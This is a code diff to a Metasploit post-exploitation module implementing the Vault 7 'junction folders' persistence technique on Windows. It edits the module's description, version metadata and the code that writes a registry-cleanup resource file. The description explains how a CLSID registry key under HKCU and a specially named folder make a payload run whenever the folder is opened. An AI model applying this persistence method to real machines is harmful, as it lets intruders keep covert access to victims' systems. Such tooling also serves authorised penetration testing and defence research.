@@ -15,12 +15,10 @@
 #
 #
 # [ DESCRIPTION ]
-# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method
-# in which the user can cause a redirection to another folder/appl. This module will add a registry hive in
-# 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload,
-# then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode).
-# In DEMO mode it will take the full path to POC folder and payload path from user inputs. also Check in
-# module ADVANCED OPTIONS for 'PERSIST_EXPLORER' (payload.dll) or 'RENAME_PERSIST' (payload.dll) options.
+# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which
+# the user can cause a redirection to another folder/appl. This module will add a registry hive in HKCU(CLSID) to be
+# abble to execute our payload, then builds a Folder named POC.{GUID} that if accessed will trigger the execution of
+# our payload. Also Check ADVANCED OPTIONS for PERSIST_EXPLORER (payload.dll) or RENAME_PERSIST (payload.dll) options.
 #
 #
 # [ MODULE OPTIONS ]
@@ -96,7 +94,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'vault7 junction folders [User-level Persistence]',
                         'Description'   => %q{
-                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder/appl. This module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode), In DEMO mode it will take the full path to POC folder and payload path from user inputs. also Check in module ADVANCED OPTIONS for 'PERSIST_EXPLORER' (payload.dll) or 'RENAME_PERSIST' (payload.dll) options.
+                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder/appl. This module will add a registry hive in HKCU(CLSID) to be abble to execute our payload, then builds a Folder named POC.{GUID} that if accessed will trigger the execution of our payload. Also Check ADVANCED OPTIONS for PERSIST_EXPLORER (payload.dll) or RENAME_PERSIST (payload.dll) options.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -106,8 +104,8 @@ class MetasploitModule < Msf::Post
                                         'special thanks: browninfosecguy | betto(ssa)', # module debug help
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
-                        'DisclosureDate' => 'jun 1 2018',
+                        'Version'        => '$Revision: 1.4',
+                        'DisclosureDate' => 'jun 2 2018',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # thats no need for privilege escalation..
@@ -313,6 +311,7 @@ def run
                r.channel.close
                r.close
            end
+         end
 
 
          #
@@ -346,23 +345,12 @@ def run
          # create cleaner resource file
          #
          print_status("Writing cleaner resource file ..")
-         loot_folder= database['LOOT_FOLDER']
          Rex::sleep(1.0)
-
-           if datastore['PERSIST_EXPLORER'] == true
-             File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
-             f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
-             f.close
-           elsif datastore['RENAME_PERSIST'] == true
-             File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
-             f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
-             f.write("cmd.exe /c rename \"#{ren_per}.{new_GUID} #{ren_per}\"")
-             f.close
-           else
-             File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
-             f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
-             f.close
-           end 
+           loot_folder = database['LOOT_FOLDER']
+           File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
+           f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+           f.close
+         end
 
 
        #
@@ -391,7 +379,5 @@ def run
    # end of the 'def run()' funtion (exploit code) ..
    #
    end
-#
-# exit module execution (_EOF) ..
-#
+
 end
